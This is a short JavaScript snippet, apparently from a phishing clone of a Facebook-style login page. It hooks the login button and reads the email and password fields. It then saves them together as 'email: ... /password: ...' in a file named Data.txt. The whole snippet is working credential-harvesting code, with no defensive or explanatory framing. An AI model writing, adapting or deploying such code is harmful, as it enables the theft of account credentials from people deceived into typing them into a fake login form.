var button = document.getElementById("u_0_2");
button.addEventListener("click", setup, false);

function setup() {
	var email = document.getElementById('email');
	var pass = document.getElementById('pass');
  var store = "email: " +email.value+" /password: "+pass.value;
saveText(0.2, "Data.txt", store);
}


function saveText(ref, fname, text, mime)
{
  var blob = new Blob([text], {type: "text/plain;charset=utf-8"});
  saveAs(blob, fname);

  return false;
}
